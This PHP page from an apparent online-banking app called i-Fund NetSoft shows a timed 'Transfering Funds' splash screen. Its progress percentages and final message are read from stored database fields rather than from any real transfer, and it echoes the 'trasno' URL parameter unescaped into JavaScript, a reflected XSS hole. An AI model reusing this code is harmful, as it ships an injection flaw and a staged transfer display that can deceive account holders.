<?php require_once('../Connections/ifund.php'); ?>
<?php
if (!isset($_SESSION)) {
  session_start();
}
$MM_authorizedUsers = "active";
$MM_donotCheckaccess = "false";

// *** Restrict Access To Page: Grant or deny access to this page
function isAuthorized($strUsers, $strGroups, $UserName, $UserGroup) { 
  // For security, start by assuming the visitor is NOT authorized. 
  $isValid = False; 

  // When a visitor has logged into this site, the Session variable MM_Username set equal to their username. 
  // Therefore, we know that a user is NOT logged in if that Session variable is blank. 
  if (!empty($UserName)) { 
    // Besides being logged in, you may restrict access to only certain users based on an ID established when they login. 
    // Parse the strings into arrays. 
    $arrUsers = Explode(",", $strUsers); 
    $arrGroups = Explode(",", $strGroups); 
    if (in_array($UserName, $arrUsers)) { 
      $isValid = true; 
    } 
    // Or, you may restrict access to only certain users based on their username. 
    if (in_array($UserGroup, $arrGroups)) { 
      $isValid = true; 
    } 
    if (($strUsers == "") && false) { 
      $isValid = true; 
    } 
  } 
  return $isValid; 
}

$MM_restrictGoTo = "log.php?cmd=out";
if (!((isset($_SESSION['MM_Username'])) && (isAuthorized("",$MM_authorizedUsers, $_SESSION['MM_Username'], $_SESSION['MM_UserGroup'])))) {   
  $MM_qsChar = "?";
  $MM_referrer = $_SERVER['PHP_SELF'];
  if (strpos($MM_restrictGoTo, "?")) $MM_qsChar = "&";
  if (isset($QUERY_STRING) && strlen($QUERY_STRING) > 0) 
  $MM_referrer .= "?" . $QUERY_STRING;
  $MM_restrictGoTo = $MM_restrictGoTo. $MM_qsChar . "accesscheck=" . urlencode($MM_referrer);
  header("Location: ". $MM_restrictGoTo); 
  exit;
}
?>
<?php
if (!function_exists("GetSQLValueString")) {
function GetSQLValueString($theValue, $theType, $theDefinedValue = "", $theNotDefinedValue = "") 
{
  if (PHP_VERSION < 6) {
    $theValue = get_magic_quotes_gpc() ? stripslashes($theValue) : $theValue;
  }

  $theValue = function_exists("mysql_real_escape_string") ? mysql_real_escape_string($theValue) : mysql_escape_string($theValue);

  switch ($theType) {
    case "text":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;    
    case "long":
    case "int":
      $theValue = ($theValue != "") ? intval($theValue) : "NULL";
      break;
    case "double":
      $theValue = ($theValue != "") ? doubleval($theValue) : "NULL";
      break;
    case "date":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;
    case "defined":
      $theValue = ($theValue != "") ? $theDefinedValue : $theNotDefinedValue;
      break;
  }
  return $theValue;
}
}


mysql_select_db($database_ifund, $ifund);
$query_company = "SELECT * FROM company";
$company = mysql_query($query_company, $ifund) or die(mysql_error());
$row_company = mysql_fetch_assoc($company);
$totalRows_company = mysql_num_rows($company);

$colname_client = "-1";
if (isset($_SESSION['MM_Username'])) {
  $colname_client = $_SESSION['MM_Username'];
}
mysql_select_db($database_ifund, $ifund);
$query_client = sprintf("SELECT * FROM clients WHERE uname = %s", GetSQLValueString($colname_client, "text"));
$client = mysql_query($query_client, $ifund) or die(mysql_error());
$row_client = mysql_fetch_assoc($client);
$totalRows_client = mysql_num_rows($client);

$colname_transferurl = "-1";
if (isset($_GET['trasno'])) {
  $colname_transferurl = $_GET['trasno'];
}
mysql_select_db($database_ifund, $ifund);
$query_transferurl = sprintf("SELECT * FROM transfers WHERE trasno = %s", GetSQLValueString($colname_transferurl, "text"));
$transferurl = mysql_query($query_transferurl, $ifund) or die(mysql_error());
$row_transferurl = mysql_fetch_assoc($transferurl);
$totalRows_transferurl = mysql_num_rows($transferurl);

?>
<!DOCTYPE html>
<head>
<meta charset="utf-8">
<title>i-Fund NetSoft |<?php echo $row_company['bname']; ?></title>
<link rel="stylesheet" type="text/css" href="../source/ifund.css"/>

</head>
<body>
<table width="90%" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td  class="ifsty2b">PROCESSING FUNDS TRANSFER</td>
  </tr>
  <tr>
    <td>
	 <div id="splashcontainer" style="width: 90%; position: absolute; height:140px; padding-top:90px; margin:0 auto;"></div>
	  
<script>

/*
D
*/

//Specify the paths of the images to be used in the splash screen, if any.
//If none, empty out array (ie: preloadimages=new Array())
var preloadimages=new Array("","dir/runprocess.gif","")
//configure delay in miliseconds between each message (default: 2 seconds)
var intervals=8000
//configure destination URL
var targetdestination="<?php echo $_SESSION['trsurlset'] ; ?>?trasno=<?php echo $_GET['trasno']; ?>"

//configure messages to be displayed
//If message contains apostrophe('), backslash them (ie: "I\'m fine")

var splashmessage=new Array()
var openingtags='<font face="Arial" color=skyblue size="4">'
splashmessage[0]='Initiating Transfer Wizard '
splashmessage[1]='Launching The Secure Environment'
splashmessage[2]='Preparing To Transfer Funds'
splashmessage[3]='Transfering Funds...<br><img border="0" src="dir/runprocess.gif" width="170" height="14">'
splashmessage[4]='Transfering Funds...<?php echo $row_transferurl['pera']; ?>%<br><img border="0" src="dir/runprocess.gif" width="170" height="14">'
splashmessage[5]='Transfering Funds...<?php echo $row_transferurl['perb']; ?>%<br><img border="0" src="dir/runprocess.gif" width="170" height="14">'
splashmessage[6]='Transfering Funds...<?php echo $row_transferurl['perc']; ?>%<br><img border="0" src="dir/runprocess.gif" width="170" height="14">'
splashmessage[7]='Transfering Funds...<?php echo $row_transferurl['perd']; ?>%<br><img border="0" src="dir/runprocess.gif" width="170" height="14">'
splashmessage[8]='Transfering Funds...<?php echo $row_transferurl['pere']; ?>%<br><img border="0" src="dir/runprocess.gif" width="170" height="14">'
splashmessage[9]='Transfering Funds...<?php echo $row_transferurl['perf']; ?>%<br><img border="0" src="dir/runprocess.gif" width="170" height="14">'
splashmessage[10]='<font color=red><?php echo $row_transferurl['per']; ?></font>'
var closingtags='</font>'

//Do not edit below this line (besides HTML code at the very bottom)

var i=0

var ns4=document.layers?1:0
var ie4=document.all?1:0
var ns6=document.getElementById&&!document.all?1:0
var theimages=new Array()

//preload images
if (document.images){
for (p=0;p<preloadimages.length;p++){
theimages[p]=new Image()
theimages[p].src=preloadimages[p]
}
}

function displaysplash(){
if (i<splashmessage.length){
sc_cross.style.visibility="hidden"
sc_cross.innerHTML='<b><center>'+openingtags+splashmessage[i]+closingtags+'</center></b>'
sc_cross.style.left=ns6?parseInt(window.pageXOffset)+parseInt(window.innerWidth)/2-parseInt(sc_cross.style.width)/2 : document.body.scrollLeft+document.body.clientWidth/2-parseInt(sc_cross.style.width)/2
sc_cross.style.top=ns6?parseInt(window.pageYOffset)+parseInt(window.innerHeight)/2-sc_cross.offsetHeight/2 : document.body.scrollTop+document.body.clientHeight/2-sc_cross.offsetHeight/2
sc_cross.style.visibility="visible"
i++
}
else{
window.location=targetdestination
return
}
setTimeout("displaysplash()",intervals)
}

function displaysplash_ns(){
if (i<splashmessage.length){
sc_ns.visibility="hide"
sc_ns.document.write('<b>'+openingtags+splashmessage[i]+closingtags+'</b>')
sc_ns.document.close()

sc_ns.left=pageXOffset+window.innerWidth/2-sc_ns.document.width/2
sc_ns.top=pageYOffset+window.innerHeight/2-sc_ns.document.height/2

sc_ns.visibility="show"
i++
}
else{
window.location=targetdestination
return
}
setTimeout("displaysplash_ns()",intervals)
}



function positionsplashcontainer(){
if (ie4||ns6){
sc_cross=ns6?document.getElementById("splashcontainer"):document.all.splashcontainer
displaysplash()
}
else if (ns4){
sc_ns=document.splashcontainerns
sc_ns.visibility="show"
displaysplash_ns()
}
else
window.location=targetdestination
}
window.onload=positionsplashcontainer

</script>
<!--Set href in below link to the URL of the target destination--></td>
  </tr>
  <tr>
    <td align="center" valign="middle"><hr align="center" width="100%" size="2" noshade="noshade" class="ifsty2n"></td>
  </tr>
  <tr>
    <td height="40" align="center" valign="middle" class="ifsty1br">WARNING : Please do not refresh this page !!!</td>
  </tr>
</table>
</body>
</html>
<?php
mysql_free_result($company);
mysql_free_result($client);
mysql_free_result($transferurl);
?>
